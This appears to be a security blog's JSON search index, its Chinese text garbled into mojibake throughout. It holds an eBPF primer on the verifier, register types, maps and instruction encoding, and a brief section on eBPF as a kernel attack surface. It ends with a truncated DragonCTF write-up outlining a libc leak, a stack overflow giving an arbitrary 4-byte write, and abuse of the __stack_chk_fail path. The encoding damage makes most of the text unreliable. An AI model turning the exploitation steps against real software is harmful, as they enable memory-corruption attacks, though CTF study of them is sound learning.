åœ¨æ•°æ®åŒ…è¿‡æ»¤ä¸Šå¼•å…¥äº†ä¸¤å¤§é©æ–°ï¼š ä¸€ä¸ªæ–°çš„è™šæ‹Ÿæœº (VM) è®¾è®¡ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å·¥ä½œåœ¨åŸºäºå¯„å­˜å™¨ç»“æ„çš„ CPU ä¹‹ä¸Šï¼› åº”ç”¨ç¨‹åºä½¿ç”¨ç¼“å­˜åªå¤åˆ¶ä¸è¿‡æ»¤æ•°æ®åŒ…ç›¸å…³çš„æ•°æ®ï¼Œä¸ä¼šå¤åˆ¶æ•°æ®åŒ…çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæœ€å¤§ç¨‹åº¦åœ°å‡å°‘BPF å¤„ç†çš„æ•°æ®ï¼Œæé«˜å¤„ç†æ•ˆç‡ï¼› å‘å±•åˆ°ä»Šå¤©ï¼ŒBPF å‡çº§ä¸º eBPF ã€‚å®ƒæ¼”è¿›æˆä¸ºäº†ä¸€å¥—é€šç”¨æ‰§è¡Œå¼•æ“ï¼Œæä¾›å¯åŸºäºç³»ç»Ÿæˆ–ç¨‹åºäº‹ä»¶é«˜æ•ˆå®‰å…¨æ‰§è¡Œç‰¹å®šä»£ç çš„é€šç”¨èƒ½åŠ›ï¼Œé€šç”¨èƒ½åŠ›çš„ä½¿ç”¨è€…ä¸å†å±€é™äºå†…æ ¸å¼€å‘è€…ã€‚åŸæ¥çš„ BPF è¢«ç§°ä¸º cBPF ï¼ˆclassic BPFï¼‰å·²è¢«èˆå¼ƒã€‚ ä¸‹é¢æ˜¯ eBPF çš„å¤§è‡´åŸç†å›¾ï¼š ç”¨æˆ·å¯ä»¥é€šè¿‡åˆ›å»ºå†…æ ¸æ¢é’ˆï¼ˆkprobeï¼‰æˆ–ç”¨æˆ·æ¢é’ˆï¼ˆuprobeï¼‰åœ¨å‡ ä¹ä»»ä½•åœ°æ–¹é™„åŠ eBPFç¨‹åºã€‚ åœ¨æˆ‘åˆšå¼€å§‹é˜…è¯» eBPF çš„ç›¸å…³èµ„æ–™æ—¶ï¼Œå°±åœ¨æƒ³ï¼Œè¿™ä¸å°±æ˜¯ä¸€ä¸ªæ•°æ®è¿‡æ»¤å—ã€‚ä½†æ˜¯ç°åœ¨æƒ³æƒ³å§ï¼Œä½ å¯ä»¥åœ¨å‡ ä¹å†…æ ¸çš„ä»»ä½•åœ°æ–¹åŠ å…¥è‡ªå·±çš„ä»£ç ã€‚å‘å†…æ ¸åŠ å…¥ç”¨æˆ·è¾“å…¥ï¼Œè¿™æœ¬èº«å°±æ˜¯ä¸€ä¸ªå¤§èƒ†åˆ›æ–°çš„æƒ³æ³•ï¼Œè€ŒåŠ å…¥è‡ªå·±çš„ç¨‹åºè¿™æ˜¯å¤šä¹ˆä»¤äººæ¿€åŠ¨ï¼ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#what-is-ebpf-"},{"categories":["Pwning"],"content":"How does it work ï¼Ÿæ­£å¦‚åŸç†å›¾ä¸­å±•ç¤ºçš„é‚£æ ·ï¼Œç”¨æˆ·éœ€è¦é¦–å…ˆä½¿ç”¨ eBPF æŒ‡ä»¤é›†ç¼–å†™ç›¸åº”çš„ eBPF ç¨‹åºï¼Œç„¶åå°†ç¨‹åºå­—èŠ‚ç å’Œç¨‹åºç±»å‹é€å…¥å†…æ ¸ï¼Œç¨‹åºç±»å‹å†³å®šäº†å¯ä»¥è®¿é—®çš„å†…æ ¸åŒºåŸŸï¼ˆå„ç§Helper Callsï¼‰ã€‚ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#how-does-it-work-"},{"categories":["Pwning"],"content":"éªŒè¯ä¸ºäº†ç¡®ä¿å®‰å…¨ï¼Œå†…æ ¸é¦–å…ˆå¯¹ä¼ å…¥çš„ç¨‹åºè¿›è¡ŒéªŒè¯ã€‚ ç¬¬ä¸€è½®æ£€æŸ¥ç¨‹åºæ˜¯å¦ä¸ºä¸€ä¸ªæœ‰å‘æ— ç¯å›¾DAGï¼Œç¬¬äºŒè½®æ£€æŸ¥ï¼Œå®ƒä¼šæ‹’ç»ä¸‹é¢çš„ç¨‹åºï¼š æŒ‡ä»¤ä¸ªæ•°å¤§äºBPF_MAXINSNSï¼ˆ4096ï¼‰ æœ‰å¾ªç¯ æœ‰æ— æ³•åˆ°è¾¾çš„æŒ‡ä»¤ï¼ˆç¨‹åºç»“æ„åªèƒ½æ˜¯ä¸€ä¸ªå‡½æ•°ä¸èƒ½æ˜¯æ£®æ—ï¼‰ è¶Šç•Œæˆ–ç•¸å½¢è·³è·ƒ æ¯ä¸ªå¯„å­˜å™¨çŠ¶æ€éƒ½æœ‰ä¸€ä¸ªç±»å‹ï¼Œ NOT_INITï¼šè¯¥å¯„å­˜å™¨è¿˜æœªå†™å…¥æ•°æ® SCALAR_VALUEï¼šæ ‡é‡å€¼ï¼Œä¸å¯ä½œä¸ºæŒ‡é’ˆ æŒ‡é’ˆç±»å‹ ä¾æ®å®ƒä»¬æŒ‡å‘çš„æ•°æ®ç»“æ„ç±»å‹ï¼Œåˆå¯ä»¥åˆ†ä¸ºï¼š PTR_TO_CTXï¼šæŒ‡å‘ bpf_context çš„æŒ‡é’ˆã€‚ CONST_PTR_TO_MAPï¼šæŒ‡å‘ struct bpf_map çš„æŒ‡é’ˆã€‚ æ˜¯å¸¸é‡ï¼ˆconstï¼‰ï¼Œå› ä¸ºä¸å…è®¸å¯¹è¿™ç§ç±»å‹æŒ‡é’ˆè¿›è¡Œç®—æœ¯æ“ä½œã€‚ PTR_TO_MAP_VALUEï¼šæŒ‡å‘ bpf map å…ƒç´ çš„æŒ‡é’ˆã€‚ PTR_TO_MAP_VALUE_OR_NULLï¼šæŒ‡å‘ bpf map å…ƒç´ çš„æŒ‡é’ˆï¼Œå¯ä¸º NULLã€‚ è®¿é—® map çš„æ“ä½œä¼šè¿”å›è¿™ç§ç±»å‹çš„æŒ‡é’ˆã€‚ç¦æ­¢ç®—æœ¯æ“ä½œã€‚ PTR_TO_STACKï¼šå¸§æŒ‡é’ˆï¼ˆFrame pointerï¼‰ã€‚ PTR_TO_PACKETï¼šæŒ‡å‘ skb-\u003edata çš„æŒ‡é’ˆã€‚ PTR_TO_PACKET_ENDï¼šæŒ‡å‘ skb-\u003edata + headlen çš„æŒ‡é’ˆã€‚ç¦æ­¢ç®—æœ¯æ“ä½œã€‚ PTR_TO_SOCKETï¼šæŒ‡å‘ struct bpf_sock_ops çš„æŒ‡é’ˆï¼Œå†…éƒ¨æœ‰å¼•ç”¨è®¡æ•°ã€‚ PTR_TO_SOCKET_OR_NULLï¼šæŒ‡å‘ struct bpf_sock_ops çš„æŒ‡é’ˆï¼Œæˆ– NULLã€‚ socket lookup æ“ä½œä¼šè¿”å›è¿™ç§ç±»å‹ã€‚æœ‰å¼•ç”¨è®¡æ•°ï¼Œ å› æ­¤ç¨‹åºåœ¨æ‰§è¡Œç»“æŸæ—¶ï¼Œå¿…é¡»é€šè¿‡ socket release å‡½æ•°é‡Šæ”¾å¼•ç”¨ã€‚ç¦æ­¢ç®—æœ¯æ“ä½œã€‚ è¿™äº›æŒ‡é’ˆéƒ½ç§°ä¸º base æŒ‡é’ˆ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:1:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#éªŒè¯"},{"categories":["Pwning"],"content":"JITé€šè¿‡éªŒè¯åï¼Œå®ƒå°±ä¼šè¿›å…¥JITç¼–è¯‘é˜¶æ®µï¼Œåˆ©ç”¨Just-In-Timeç¼–è¯‘å™¨ï¼Œç¼–è¯‘ç”Ÿæˆçš„æ˜¯é€šç”¨çš„å­—èŠ‚ç ï¼Œå®ƒæ˜¯å®Œå…¨å¯ç§»æ¤çš„ï¼Œå¯ä»¥åœ¨x86å’ŒARMç­‰ä»»æ„çƒCPUæ¶æ„ä¸ŠåŠ è½½è¿™ä¸ªå­—èŠ‚ç ï¼Œè¿™æ ·æˆ‘ä»¬èƒ½è·å¾—æœ¬åœ°ç¼–è¯‘åçš„ç¨‹åºè¿è¡Œé€Ÿåº¦ï¼Œè€Œä¸”æ˜¯å®‰å…¨å¯é çš„ã€‚ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:2:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#jit"},{"categories":["Pwning"],"content":"Mapsmaps æ˜¯ eBPF çš„æ•°æ®å­˜å‚¨æ•°æ®åº“ï¼Œåœ¨ç¨‹åºä¸­ç”±ç”¨æˆ·é€šè¿‡ç›¸åº”çš„å‡½æ•°åˆ›å»ºï¼Œå®ƒæ”¯æŒä»¥ä¸‹ç±»å‹ï¼š Hash tables, Arrays LRU (Least Recently Used) Ring Buffer Stack Trace LPM (Longest Prefix match) â€¦â€¦ ä¸€ä¸ªå®šä¹‰çš„ä¾‹å­ï¼š // SEC(\"maps\") è¡¨ç¤ºå°†è¿™ä¸ªç»“æ„ç¼–è¯‘åˆ°ä¸€ä¸ªæ–°åˆ›å»ºçš„åä¸º maps çš„ .section struct bpf_map_def SEC(\"maps\") my_map = { .type = BPF_MAP_TYPE_ARRAY, .key_size = sizeof(u32), .value_size = sizeof(long), .max_entries = 256, }; å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š BPF Mapæ˜¯å¯ä»¥è¢«ç”¨æˆ·ç©ºé—´è®¿é—®å¹¶æ“ä½œçš„ BPF Mapæ˜¯å¯ä»¥ä¸BPFç¨‹åºåˆ†ç¦»çš„ï¼Œå³å½“åˆ›å»ºä¸€ä¸ªBPF Mapçš„BPFç¨‹åºè¿è¡Œç»“æŸåï¼Œè¯¥BPF Mapè¿˜èƒ½å­˜åœ¨ï¼Œè€Œä¸æ˜¯éšç€ç¨‹åºä¸€èµ·æ¶ˆäº¡ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:3:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#maps"},{"categories":["Pwning"],"content":"Helper Callsåœ¨ eBPF çš„ç¨‹åºä¸­ä¸èƒ½ç›´æ¥è°ƒç”¨å†…æ ¸å‡½æ•°ã€‚å› ä¸ºå†…æ ¸ç‰ˆæœ¬ä¸æ–­æ›´æ–°ï¼Œå¾ˆå¤šå‡½æ•°ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™å¯èƒ½å¯¼è‡´ eBPF çš„å¤±æ•ˆã€‚ä¸ºäº†é¿å…è¿™æ ·ï¼Œå†…æ ¸æä¾›äº† helper calls çš„ APIï¼Œæ— éœ€äº†è§£å…¶å®ç°ï¼Œåªéœ€ä½¿ç”¨å³å¯ã€‚å¦ä¸€æ–¹é¢ï¼Œè¿™ä¹Ÿæ‹“å±•äº† eBPF çš„åŠŸèƒ½ã€‚ bpf-helpers(7) - Linux manual page ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:4:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#helper-calls"},{"categories":["Pwning"],"content":"æŒ‡ä»¤é›†eBPF çš„æŒ‡ä»¤ç»“æ„å¦‚ä¸‹ï¼š struct bpf_insn { __u8 code; /* opcode */ __u8 dst_reg:4; /* dest register */ __u8 src_reg:4; /* source register */ __s16 off; /* signed offset */ __s32 imm; /* signed immediate constant */ }; åœ¨ eBPF ä¸­æœ‰ 11 ä¸ª 64ä½å¯„å­˜å™¨ R0-R10 R0 è¿”å›å€¼å¯„å­˜å™¨ R1-R5 å‡½æ•°å‚æ•° R6-R9 è¢«è°ƒç”¨å‡½æ•°ä¿ç•™ R10 åªè¯»æ ˆå¸§å¯„å­˜å™¨ å…¶æ ˆçš„å¤§å°å›ºå®šä¸º512å­—èŠ‚ã€‚å½“ä¸€ä¸ª eBPF ç¨‹åºå¯åŠ¨æ—¶ï¼ŒR1 ä¸­çš„åœ°å€æŒ‡å‘ context ä¸Šä¸‹æ–‡ï¼ˆå½“å‰æƒ…å†µä¸‹ä¸ºæ•°æ®åŒ…ç¼“å†²åŒºï¼‰ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#æŒ‡ä»¤é›†"},{"categories":["Pwning"],"content":"opcode ç»“æ„ +-------------------------+--------------------+ | 5 bits | 3 bits | | xxxxxx | instruction class | +-------------------------+--------------------+ (MSB) (LSB) opå­—æ®µçš„ä½3ä½ï¼Œå†³å®šæŒ‡ä»¤ç±»å‹ã€‚ Code: include/uapi/linux/bpf.h #define BPF_CLASS(code) ((code) \u0026 0x07) #define BPF_LD 0x00 #define BPF_LDX 0x01 #define BPF_ST 0x02 #define BPF_STX 0x03 #define BPF_ALU 0x04 #define BPF_JMP 0x05 #define BPF_JMP32 0x06 /* jmp mode in word width */#define BPF_ALU64 0x07 /* alu mode in double word width */ BPF_LD, BPF_LDX: ä¸¤ä¸ªç±»éƒ½ç”¨äºåŠ è½½æ“ä½œã€‚BPF_LDç”¨äºåŠ è½½åŒå­—ã€‚åè€…æ˜¯ä» cBPF ç»§æ‰¿è€Œæ¥çš„ï¼Œä¸»è¦æ˜¯ä¸ºäº†ä¿æŒ cBPF åˆ° BPF çš„è½¬æ¢æ•ˆç‡ï¼Œå› ä¸ºå®ƒä»¬ä¼˜åŒ–äº† JIT ä»£ç ã€‚ BPF_ST, BPF_STX: ä¸¤ä¸ªç±»éƒ½ç”¨äºå­˜å‚¨æ“ä½œï¼Œç”¨äºå°†æ•°æ®ä»å¯„å­˜å™¨åˆ°å­˜å‚¨å™¨ä¸­ã€‚ BPF_ALU, BPF_ALU64: åˆ†åˆ«æ˜¯32ä½å’Œ64ä½ä¸‹çš„ALUæ“ä½œã€‚ BPF_JMPå’ŒBPF_JMP32ï¼šè·³è½¬æŒ‡ä»¤ã€‚JMP32çš„è·³è½¬èŒƒå›´æ˜¯32ä½å¤§å°(ä¸€ä¸ª word) ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:1:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#opcode-ç»“æ„"},{"categories":["Pwning"],"content":"åŠ è½½å’Œå­˜å‚¨æŒ‡ä»¤æ­¤æ—¶ï¼š +--------+--------+-------------------+ | 3 bits | 2 bits | 3 bits | | mode | size | instruction class | +--------+--------+-------------------+ (MSB) (LSB) sizeå†³å®šäº†æ“ä½œæ•°æ®çš„å¤§å° BPF_W 0x00 /* word=4 byte */ BPF_H 0x08 /* half word */ BPF_B 0x10 /* byte */ BPF_DW 0x18 /* eBPF only, double word */ mode BPF_IMM 0x00 /* used for 32-bit mov in classic BPF and 64-bit in eBPF */ BPF_ABS 0x20 BPF_IND 0x40 BPF_MEM 0x60 BPF_LEN 0x80 /* classic BPF only, reserved in eBPF */ BPF_MSH 0xa0 /* classic BPF only, reserved in eBPF */ BPF_ATOMIC 0xc0 /* eBPF only, atomic operations */ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:1:1","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#åŠ è½½å’Œå­˜å‚¨æŒ‡ä»¤"},{"categories":["Pwning"],"content":"è·³è½¬ä¸è¿ç®—æŒ‡ä»¤æ­¤æ—¶ï¼š +----------------+--------+--------------------+ | 4 bits | 1 bit | 3 bits | | operation code | source | instruction class | +----------------+--------+--------------------+ (MSB) (LSB) #define BPF_SRC(code) ((code) \u0026 0x08) BPF_K 0x00 BPF_X 0x08 BPF_SRC(code) == BPF_X - use 'src_reg' register as source operand BPF_SRC(code) == BPF_K - use 32-bit immediate as source operand å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å®å®šä¹‰å¿«é€Ÿçš„ç¼–å†™æŒ‡ä»¤ï¼ŒCode: samples/bpf/bpf_insn.hï¼š /* SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause) */ /* eBPF instruction mini library */ #ifndef __BPF_INSN_H #define __BPF_INSN_H struct bpf_insn; /* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */ #define BPF_ALU64_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_ALU32_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */ #define BPF_ALU64_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_ALU32_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Short form of mov, dst_reg = src_reg */ #define BPF_MOV64_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_MOV32_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* Short form of mov, dst_reg = imm32 */ #define BPF_MOV64_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_MOV32_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */ #define BPF_LD_IMM64(DST, IMM) \\ BPF_LD_IMM64_RAW(DST, 0, IMM) #define BPF_LD_IMM64_RAW(DST, SRC, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_DW | BPF_IMM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = (__u32) (IMM) }), \\ ((struct bpf_insn) { \\ .code = 0, /* zero is reserved opcode */\\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = ((__u64) (IMM)) \u003e\u003e 32 }) #ifndef BPF_PSEUDO_MAP_FD # define BPF_PSEUDO_MAP_FD 1 #endif /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */ #define BPF_LD_MAP_FD(DST, MAP_FD) \\ BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD) /* Direct packet access, R0 = *(uint *) (skb-\u003edata + imm32) */ #define BPF_LD_ABS(SIZE, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Memory load, dst_reg = *(uint *) (src_reg + off16) */ #define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* Memory store, *(uint *) (dst_reg + off16) = src_reg */ #define BPF_STX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* * Atomic operations: * * BPF_ADD *(uint *) (dst_reg + off16) += src_reg * BPF_AND *(uint *) (dst_reg + off16) \u0026= src_reg * BPF_OR *(uint *) (dst_reg + off16) |= src_reg * BPF_XOR *(uint *) (dst_reg + off16) ^= src_reg * BPF_ADD | BPF_FETCH src_reg = atomic_fetch_add(dst_reg + off16, src_reg); * BPF_AND | BPF_FETCH src_reg = atomic_fetch_and(dst_reg + off16, src_reg); * BPF_OR | BPF_FETCH src_reg = atomic_fetch_or(dst_reg + off16, src_reg); * BPF_XOR | BPF_FETCH src_reg = atomic_fetch_xor(dst_reg + off16, src_reg); * BPF_XCHG src_reg = atomic_xchg(dst_reg + off16, src_re","date":"2022-01-17","objectID":"/ebpf-basic-learning/:1:2","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#è·³è½¬ä¸è¿ç®—æŒ‡ä»¤"},{"categories":["Pwning"],"content":"Securityè™½ç„¶å†…æ ¸å¯¹ç”¨æˆ·è¾“å…¥åšäº†å¾ˆå¤šçš„é˜²æŠ¤ï¼Œä½†æ˜¯ä¾ç„¶æ²¡æœ‰é˜»æ­¢ eBPF ä½œä¸ºæ–°çš„å†…æ ¸æ”»å‡»é¢ã€‚ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#security"},{"categories":["Pwning"],"content":"OOBç”¨æˆ·ä¸å†…æ ¸å”¯ä¸€çš„å±éšœæ˜¯ verify ï¼Œå¦‚æœç»•è¿‡é‚£ä¹ˆå°±å¯ä»¥å®ç°æ³¨å…¥äº†ã€‚ eBPF ä¼šå¯¹è¯»å–å¯¹åº”ç±»å‹çš„å†…æ ¸ç¼“å†²åŒº context å’Œ mapï¼Œè¿™é‡Œæ¶‰åŠåˆ°ï¼Œç¨‹åºè¯»å–çš„å€¼ä¸èƒ½é©¬ä¸Šç¡®å®šï¼Œè€Œç¨‹åºåˆè¦å¯¹æ•°æ®è¿›è¡Œå…¶ä»–çš„è¿ç®—ï¼Œå¦‚ä½•ä¿è¯å¾—åˆ°çš„æ•°æ®ç­‰ä¸è¶…ç•Œï¼Ÿ eBPF å¯„å­˜å™¨ç»“æ„ï¼š struct bpf_reg_state { /* Ordering of fields matters. See states_equal() */ enum bpf_reg_type type; union { /* valid when type == PTR_TO_PACKET */ u16 range; /* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE | * PTR_TO_MAP_VALUE_OR_NULL */ struct bpf_map *map_ptr; /* Max size from any of the above. */ unsigned long raw; }; s32 off; u32 id; u32 ref_obj_id; struct tnum var_off; s64 smin_value; /* minimum possible (s64)value */ s64 smax_value; /* maximum possible (s64)value */ u64 umin_value; /* minimum possible (u64)value */ u64 umax_value; /* maximum possible (u64)value */ struct bpf_reg_state *parent; u32 frameno; s32 subreg_def; enum bpf_reg_liveness live; bool precise; }; struct tnum { u64 value; u64 mask; }; umin_valueå’Œ umax_valueï¼šå½“è§£é‡Šå™¨å°†å¯„å­˜å™¨çš„å€¼è§£é‡Šä¸ºæ— ç¬¦å·æ•´æ•°æ—¶çš„æœ€å°å€¼å’Œæœ€å¤§å€¼ smin_value å’Œ smax_valueï¼šå½“è§£é‡Šå™¨å°†å¯„å­˜å™¨çš„å€¼è§£é‡Šä¸ºæœ‰ç¬¦å·æ•´æ•°æ—¶çš„æœ€å°å€¼å’Œæœ€å¤§å€¼ var_off: ç”¨æ¥æè¿°æ— æ³•ç¡®å®šçš„å€¼ï¼Œæ—¢ç„¶æœ‰å¾…å®šçš„å€¼ï¼Œä¸€ä¸ªä½çš„çŠ¶æ€å°±å˜æˆäº†ä¸‰ç§ï¼Œâ€˜0â€™ã€â€˜1â€™å’ŒæœªçŸ¥ã€‚å¦‚æœä¸€ä¸ªæ•°çš„æŸä½æ˜¯ç¡®å®šçš„ï¼Œé‚£ä¹ˆå…¶åœ¨valueä¸­çš„å€¼å°±æ˜¯å®ƒçš„çœŸå€¼ï¼Œå¯¹åº”maskä¸­çš„ä½ä¸º0ï¼Œå¦‚æœæŸä½æ— æ³•ç¡®å®šï¼Œé‚£ä¹ˆmaskä¸­å¯¹åº”çš„ä½ä¸º1ã€‚ ä¾‹å¦‚ï¼š var_offâ†’value = 0b010, value-\u003emask = 0b100ï¼Œé‚£ä¹ˆè¿™ä¸ªå€¼å°±å¯èƒ½ä¸º0b010æˆ–0b110ã€‚ ä¸Šè¿°è¿™äº”ä¸ªæ•°æ®å¯ä»¥ç›¸äº’æ›´æ–°ï¼Œä¾‹å¦‚å¦‚æœ umax_value å°äº 2^63ï¼Œåˆ™ smin_value ä¼šè¢«è®¾ç½®ä¸º 0ï¼ˆå› ä¸ºä¸ä¼šæœ‰è´Ÿæ•°å‡ºç°ï¼‰ï¼Œå¦‚æœ var_off æŒ‡ç¤ºå¯„å­˜å™¨åªæœ‰æœ€ä½ 3 ä½å¯èƒ½ä¸º 1,åˆ™ umax_value ä¸º 7ã€‚ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:1:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#oob"},{"categories":["Pwning"],"content":"ReferenceLinuxè¶…èƒ½åŠ›BPFæŠ€æœ¯ä»‹ç»åŠå­¦ä¹ åˆ†äº«ï¼ˆé™„PPTï¼‰ What is eBPF? An Introduction and Deep Dive into the eBPF Technology [è¯‘] Linux Socket Filtering (LSF, aka BPF)ï¼ˆKernelDocï¼Œ2021ï¼‰ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#reference"},{"categories":["Writeups"],"content":"Nimå‘¨æœ«å’ŒNu1Lçš„å¸ˆå‚…ä¸€èµ·æ‰“äº†DragonCTFï¼Œé¢˜ç›®è´¨é‡å¾ˆé«˜ï¼Œè¢«å¸ˆå‚…ä»¬å¸¦äº†ã€‚ Nimå®ç°äº†å°¼å§†æ¸¸æˆï¼ˆNimï¼‰ï¼Œç©å®¶å’ŒDealerï¼ˆç”µè„‘ï¼‰è½®æµä»å †ä¸­å–çŸ³å¤´ï¼Œå †çš„æ•°ç›®å¤§äºç­‰äº8ï¼Œæ¯æ¬¡åªèƒ½ä»ä¸€ä¸ªå †ä¸­å–ï¼Œå–çš„æ•°é‡è¦å¤§äº0ã€‚è°å°†æœ€åä¸€å—å–å‡ºå³å¯èµ¢å¾—æ¸¸æˆã€‚ ç¨‹åºæœ‰ä¸¤ä¸ªæ¼æ´ç‚¹å¯ä»¥åˆ©ç”¨ï¼š ä½¿ç”¨randå‡½æ•°åœ°å€ï¼Œè‡ªå·±å®ç°çš„ä¼ªéšæœºæ•°ç”Ÿæˆå‡½æ•° å †çš„æ•°é‡ç”±ç©å®¶æŒ‡å®šé€ æˆçš„æ ˆæº¢å‡º ç¨‹åºå¼€å¯äº†æ‰€æœ‰çš„ä¿æŠ¤ï¼Œè¿™ä»£è¡¨ç€æœ‰Canaryã€‚ æ ˆæº¢å‡ºå¾ˆå®¹æ˜“éƒ½èƒ½çœ‹å‡ºæ¥ï¼Œä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰é‡è§†randå‡½æ•°ã€‚åœ¨åˆ†æçš„æ—¶å€™ï¼Œæˆ‘å‘ç°è¿™ä¸ªç¨‹åºæ˜¯ç”±c \u0026 c++æ··å†™çš„ï¼Œæ‰€ä»¥æˆ‘å°è¯•ç”¨å¼‚å¸¸å¤„ç†å»ç»•è¿‡canaryä¿æŠ¤ã€‚å®é™…çš„åˆ©ç”¨å¹¶ä¸æ˜¯è¿™æ ·ã€‚ é¦–å…ˆï¼Œç¬¬ä¸€ä¸ªå †å—çš„çŸ³å¤´æ•°é‡ä¸ºrand \u0026 0x7fffffffï¼Œå¯ä»¥é€šè¿‡æ¨¡æ‹Ÿå…¶éšæœºæ•°ç”Ÿæˆï¼Œå¾—åˆ°randå‡½æ•°çš„åœ°å€ä»è€Œleak libcã€‚ ç¬¬äºŒç‚¹æ˜¯ï¼Œgameç¨‹åºæœ‰å…«ä¸ªå‚æ•°ï¼Œè¿™æ„å‘³ç€æœ‰ä¸¤ä¸ªå‚æ•°ä¼šé€šè¿‡æ ˆè¿›è¡Œä¼ é€’ã€‚äºŒæ ˆæº¢å‡ºå¯ä»¥å¯¹å®ƒä»¬è¿›è¡Œä¿®æ”¹ã€‚æ³¨æ„åˆ°åœ¨æ¸¸æˆç»“æŸåï¼Œæˆ‘ä»¬çš„åˆ†æ•°å¦‚æœè¶…è¿‡è®°å½•ï¼Œåˆ™ä¼šå°†åˆ†æ•°ï¼ˆintï¼‰ï¼Œæ”¾åˆ°ç¬¬å…«ä¸ªå‚æ•°æŒ‡å‘çš„ä½ç½®ã€‚Yesï¼Œæˆ‘ä»¬å¯ä»¥ä»»æ„åœ°å€å†™å››å­—èŠ‚æ•°æ®ã€‚ ä¹‹åï¼Œä¼šè§¦å‘``__stack_chk_failï¼Œè¿›ä¸€æ­¥æ‰§è¡Œ__fortify_fail-\u003e__libc_messageï¼Œ__libc_messageä¸­é€šè¿‡libc@gotè°ƒç”¨äº†ä¸‰ä¸ªå‡½æ•°strchrnulï¼Œ 